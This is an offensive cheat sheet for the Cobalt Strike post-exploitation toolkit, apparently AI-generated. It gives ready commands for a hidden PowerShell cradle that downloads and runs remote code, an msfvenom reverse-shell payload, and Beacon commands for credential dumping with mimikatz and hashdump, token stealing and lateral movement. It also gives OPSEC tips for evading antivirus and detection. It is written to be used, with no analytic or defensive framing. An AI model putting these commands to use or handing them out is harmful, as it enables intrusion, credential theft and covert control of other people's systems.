# Cobalt Strike Cheat Sheet (Red Team Edition)

## ☣️ Overview

Cobalt Strike is a commercial post-exploitation toolkit used in Red Team operations. It features an advanced **Beacon payload**, **team server**, **scripting via Aggressor Script**, and built-in support for **pivoting**, **lateral movement**, and **OPSEC-safe C2**.

---

## ⚙️ Starting the Team Server

```bash
./teamserver <IP> <password>
```

Example:
```bash
./teamserver 192.168.1.100 SecretPass123
```

---

## 💉 Payload Generation

### HTTP/S Beacon

```
Attacks → Packages → Windows Executable (S)
```

### Raw Binary / PowerShell Launcher

```
Attacks → Packages → Windows PowerShell
```

Example:
```
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/a')"
```

---

## 📡 Listener Setup

```
Cobalt Strike → C2 Listener Manager → Add Listener
```

Common types:
- HTTP
- HTTPS
- DNS
- SMB
- External redirectors (Nginx, Apache mod_rewrite)

---

## 🔗 Initial Access & Dropper Examples

### Weaponized LNK or Office Macro

Use:
- `SharpShooter`
- `MacroPack`
- `Donut` for .NET payload generation

### Cobalt Strike + Metasploit

```
msfvenom -p windows/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f exe
```

Upload and run to stage into Beacon.

---

## 💻 Beacon Commands (Post-Exploitation)

### Session Info

```
beacon> getuid
beacon> ipconfig
beacon> netstat
beacon> shell whoami
```

### Pivoting

```
beacon> jump smb <target> <listener>
beacon> link <beacon_id>
```

### Credential Dumping

```
beacon> mimikatz
beacon> hashdump
beacon> wdigest
```

### Lateral Movement

```
beacon> jump psexec <target>
beacon> jump winrm <target>
```

### File Operations

```
beacon> ls
beacon> cd
beacon> download <file>
beacon> upload <file>
```

### Execute Commands

```
beacon> shell <cmd>
beacon> powershell <cmd>
```

---

## 🎯 Lateral Movement Techniques

- **Psexec**
- **WMI**
- **WinRM**
- **Token stealing**
- **Spawn to (x64/x86)** to match process arch
- **Named pipe pivoting**

---

## 🧬 Aggressor Script Usage

Aggressor Script lets you automate Cobalt Strike tasks.

Example:

```javascript
on beacon_initial {
  println("New beacon: $1");
  beacon_command($1, "getuid");
}
```

Load via:
```
Cobalt Strike → Script Manager
```

---

## 🔐 OPSEC Tips

- Avoid default settings — customize watermark, PE metadata, process injection settings
- Use **sleep/jitter** to avoid noisy callbacks
```
beacon> sleep 60000 20
```
- Avoid `mimikatz` directly; use `sekurlsa::logonpasswords` via shell or run tools from memory
- Prefer **in-memory** execution (`execute-assembly`, `shinject`, `psinject`)
- Use **spawn-to** to avoid AV (run in known-safe processes)
- Use **HTTPS with redirectors**, not direct IPs

---

## 🧰 Useful Commands Summary

```
getuid                         → Show user context  
ps                             → Show processes  
inject <pid> <listener>        → Inject beacon  
shell <command>                → Run command via cmd.exe  
powershell <command>           → Run PowerShell in memory  
mimikatz                       → Credential dumping  
rev2self                       → Drop tokens  
steal_token <pid>              → Use token from process  
jump smb/wmi/psexec/winrm      → Move laterally  
spawnas user pass              → Run as another user  
```

---

## 📌 Integration Notes

- Pair with BloodHound for attack pathing
- Use Covenant or Sliver for diversion or multi-C2
- Cobalt Strike + redirectors = safer infrastructure

---

Let me know if you want this paired with **redirector setup**, **Evasion Profiles**, or **Aggressor Script snippets for automated workflows**.

